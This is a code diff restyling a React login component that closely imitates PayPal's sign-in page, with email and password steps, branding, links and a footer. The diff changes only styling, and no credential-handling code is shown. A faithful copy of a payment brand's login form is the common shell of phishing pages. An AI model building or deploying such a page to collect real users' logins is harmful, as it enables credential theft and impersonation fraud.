@@ -1,4 +1,6 @@
 import { useEffect, useState } from 'react';
+import { ChevronDown } from 'lucide-react';
+
 interface LoginPageProps {
   onLoginSuccess: (email: string) => void;
 }
@@ -41,8 +43,9 @@ export function LoginPage({ onLoginSuccess }: LoginPageProps) {
       return () => clearTimeout(timer);
     }
   }, [step]);
+
   return (
-    <div className="relative min-h-screen w-full bg-[#f5f7fa] flex flex-col items-center justify-between font-['Inter',sans-serif]">
+    <div className="relative min-h-screen w-full bg-[#FAFAFA] flex flex-col items-center justify-between font-['Inter',sans-serif]">
       {/* Loading Overlay */}
       {step === 'loading' && (
         <div className="absolute inset-0 z-50 bg-white flex flex-col items-center justify-center">
@@ -60,163 +63,126 @@ export function LoginPage({ onLoginSuccess }: LoginPageProps) {
       )}
 
       {/* Main Card */}
-      <div className="flex-1 flex items-center justify-center w-full px-4 py-12">
-        <div className="w-full max-w-[500px] bg-white rounded-2xl shadow-sm border border-gray-100 px-8 py-12 flex flex-col items-center">
+      <div className="flex-1 flex items-center justify-center w-full px-4 py-8 sm:py-12">
+        <div className="w-full max-w-[460px] bg-white rounded-[20px] sm:border border-[#E5E5E5] px-6 sm:px-10 py-10 sm:py-16 flex flex-col items-center sm:shadow-[0_2px_12px_rgba(0,0,0,0.04)]">
           {/* PayPal Logo */}
-          <h1 className="text-3xl font-black tracking-tight text-gray-900 mb-10">
-            <span className="text-[#003087]">Pay</span>
-            <span className="text-[#0079C1]">Pal</span>
-          </h1>
+          <div className="mb-8 sm:mb-12">
+            <h1 className="text-[28px] sm:text-[32px] font-bold text-black tracking-tight">PayPal</h1>
+          </div>
 
-          <form onSubmit={handleSubmit} className="w-full flex flex-col items-center">
-            {step === 'email' || step === 'loading' ?
-            <>
-                {/* Email Input */}
-                <div className="w-full mb-2">
-                  <div className="relative w-full">
-                    <input
+          <form onSubmit={handleSubmit} className="w-full flex flex-col">
+            {step === 'email' || step === 'loading' ? (
+              <>
+                <div className="w-full mb-4">
+                  <input
                     type="text"
                     value={email}
                     onChange={(e) => setEmail(e.target.value)}
-                    placeholder=" "
-                    className="peer w-full px-4 pt-6 pb-3 border-2 border-gray-300 rounded-lg text-base text-gray-900 outline-none focus:border-[#0079C1] transition-colors" />
-                  
-                    <label className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 text-base pointer-events-none transition-all peer-focus:top-3.5 peer-focus:text-xs peer-focus:text-[#0079C1] peer-[:not(:placeholder-shown)]:top-3.5 peer-[:not(:placeholder-shown)]:text-xs">
-                      Email or mobile number
-                    </label>
-                  </div>
+                    placeholder="Email or mobile number"
+                    className="w-full px-4 py-[18px] border border-[#ADB5BD] rounded-lg text-base text-gray-900 outline-none focus:border-[#0070BA] focus:ring-1 focus:ring-[#0070BA] transition-all placeholder:text-[#6C757D]"
+                  />
                 </div>
 
-                {/* Forgot Email */}
-                <div className="w-full mb-6 text-left self-start">
-                  <a
-                  href="#"
-                  className="text-[#0079C1] text-sm font-semibold hover:underline">
-                  
+                <div className="w-full mb-8">
+                  <a href="#" className="text-[#0070BA] text-[15px] font-bold hover:underline">
                     Forgot email?
                   </a>
                 </div>
 
-                {/* Next Button */}
                 <button
-                type="submit"
-                className="w-full py-3.5 bg-[#0070BA] hover:bg-[#005EA6] text-white font-bold text-base rounded-full transition-colors mb-6">
-                
+                  type="submit"
+                  className="w-full py-4 bg-[#0054BB] hover:bg-[#004294] text-white font-bold text-[17px] rounded-full transition-colors mb-8 shadow-sm"
+                >
                   Next
                 </button>
-              </> :
-
-            <>
-                {/* Email Display with Change */}
-                <div className="flex items-center gap-3 mb-8 self-start">
+              </>
+            ) : (
+              <>
+                <div className="flex items-center gap-3 mb-8">
                   <span className="text-base text-gray-900">{email}</span>
                   <button
-                  type="button"
-                  onClick={handleChange}
-                  className="text-[#0079C1] text-base font-semibold hover:underline">
-                  
+                    type="button"
+                    onClick={handleChange}
+                    className="text-[#0070BA] text-base font-bold hover:underline"
+                  >
                     Change
                   </button>
                 </div>
 
-                {/* Password Input */}
-                <div className="w-full mb-2">
-                  <div className="relative w-full flex gap-2">
-                    <div className="relative flex-1">
-                      <input
-                      type={showPassword ? 'text' : 'password'}
-                      value={password}
-                      onChange={(e) => setPassword(e.target.value)}
-                      placeholder=" "
-                      className="peer w-full px-4 pt-6 pb-3 border-2 border-gray-300 rounded-lg text-base text-gray-900 outline-none focus:border-[#0079C1] transition-colors bg-[#FFF9DB]" />
-                    
-                      <label className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 text-sm pointer-events-none transition-all peer-focus:top-3.5 peer-focus:text-xs peer-focus:text-[#0079C1] peer-[:not(:placeholder-shown)]:top-3.5 peer-[:not(:placeholder-shown)]:text-xs">
-                        Password
-                      </label>
-                    </div>
-                    <button
+                <div className="w-full mb-4 relative">
+                  <input
+                    type={showPassword ? 'text' : 'password'}
+                    value={password}
+                    onChange={(e) => setPassword(e.target.value)}
+                    placeholder="Password"
+                    className="w-full px-4 py-[18px] border border-[#ADB5BD] rounded-lg text-base text-gray-900 outline-none focus:border-[#0070BA] focus:ring-1 focus:ring-[#0070BA] transition-all placeholder:text-[#6C757D]"
+                  />
+                  <button
                     type="button"
                     onClick={() => setShowPassword(!showPassword)}
-                    className="px-3 py-2 border-2 border-gray-300 rounded-lg text-[#0079C1] text-sm font-semibold hover:border-[#0079C1] transition-colors shrink-0">
-                    
-                      {showPassword ? 'Hide' : 'Show'}
-                    </button>
-                  </div>
+                    className="absolute right-4 top-1/2 -translate-y-1/2 text-[#0070BA] text-[15px] font-bold hover:underline"
+                  >
+                    {showPassword ? 'Hide' : 'Show'}
+                  </button>
                 </div>
 
-                {/* Forgot Password */}
-                <div className="w-full mb-6 text-left self-start">
-                  <a
-                  href="#"
-                  className="text-[#0079C1] text-sm font-semibold hover:underline">
-                  
+                <div className="w-full mb-8">
+                  <a href="#" className="text-[#0070BA] text-[15px] font-bold hover:underline">
                     Forgot password?
                   </a>
                 </div>
 
-                {/* Log In Button */}
-                <button 
+                <button
                   type="submit"
-                  className="w-full py-3.5 bg-[#0070BA] hover:bg-[#005EA6] text-white font-bold text-base rounded-full transition-colors mb-6"
+                  className="w-full py-4 bg-[#0054BB] hover:bg-[#004294] text-white font-bold text-[17px] rounded-full transition-colors mb-8 shadow-sm"
                 >
                   Log In
                 </button>
               </>
-            }
+            )}
           </form>
 
           {/* Divider */}
-          <div className="w-full flex items-center gap-4 mb-6">
-            <div className="flex-1 h-px bg-gray-300" />
-            <span className="text-gray-500 text-sm">or</span>
-            <div className="flex-1 h-px bg-gray-300" />
+          <div className="w-full flex items-center gap-4 mb-8">
+            <div className="flex-1 h-[1px] bg-[#E5E5E5]" />
+            <span className="text-[#6C757D] text-[13px]">or</span>
+            <div className="flex-1 h-[1px] bg-[#E5E5E5]" />
           </div>
 
           {/* Sign Up Button */}
-          <button className="w-full py-3.5 border-2 border-gray-800 text-gray-900 font-bold text-base rounded-full hover:bg-gray-50 transition-colors mb-10">
+          <button className="w-full py-4 border border-black text-black font-bold text-[17px] rounded-full hover:bg-gray-50 transition-colors mb-16">
             Sign Up
           </button>
 
           {/* Language Selector */}
-          <div className="flex items-center gap-2 text-sm text-gray-600 mt-auto">
-            <span className="text-lg">🇺🇸</span>
-            <span className="font-semibold text-gray-900">English</span>
-            <span className="text-gray-300">|</span>
-            <a href="#" className="hover:underline">
-              Français
-            </a>
-            <span className="text-gray-300">|</span>
-            <a href="#" className="hover:underline">
-              Español
-            </a>
-            <span className="text-gray-300">|</span>
-            <a href="#" className="hover:underline">
-              中文
-            </a>
+          <div className="flex flex-col sm:flex-row items-center gap-4 text-[14px] text-[#2C2E2F] font-medium">
+            <div className="flex items-center gap-1.5 cursor-pointer">
+              <img src="https://flagcdn.com/w20/us.png" alt="US Flag" className="w-5 h-3.5 object-cover rounded-[1px]" />
+              <ChevronDown className="w-4 h-4 text-[#6C757D]" />
+            </div>
+            <div className="flex items-center gap-2 sm:gap-3 flex-wrap justify-center">
+              <span className="text-black font-bold">English</span>
+              <span className="text-[#E5E5E5] hidden sm:inline">|</span>
+              <a href="#" className="hover:underline text-[#2C2E2F]">Français</a>
+              <span className="text-[#E5E5E5] hidden sm:inline">|</span>
+              <a href="#" className="hover:underline text-[#2C2E2F]">Español</a>
+              <span className="text-[#E5E5E5] hidden sm:inline">|</span>
+              <a href="#" className="hover:underline text-[#2C2E2F]">中文</a>
+            </div>
           </div>
         </div>
       </div>
 
       {/* Footer */}
-      <footer className="w-full bg-gray-800 py-4 px-6">
-        <div className="flex items-center justify-center gap-4 text-xs text-gray-300 flex-wrap">
-          <a href="#" className="hover:text-white hover:underline">
-            Contact Us
-          </a>
-          <a href="#" className="hover:text-white hover:underline">
-            Privacy
-          </a>
-          <a href="#" className="hover:text-white hover:underline">
-            Legal
-          </a>
-          <a href="#" className="hover:text-white hover:underline">
-            Policy Updates
-          </a>
-          <a href="#" className="hover:text-white hover:underline">
-            Worldwide
-          </a>
+      <footer className="w-full py-6 px-6 bg-white border-t border-[#E5E5E5]">
+        <div className="flex items-center justify-center gap-6 text-[12px] font-medium text-[#6C757D] flex-wrap uppercase tracking-wider">
+          <a href="#" className="hover:underline">Contact Us</a>
+          <a href="#" className="hover:underline">Privacy</a>
+          <a href="#" className="hover:underline">Legal</a>
+          <a href="#" className="hover:underline">Policy Updates</a>
+          <a href="#" className="hover:underline">Worldwide</a>
         </div>
       </footer>
-    </div>);
-
+    </div>
+  );
 }
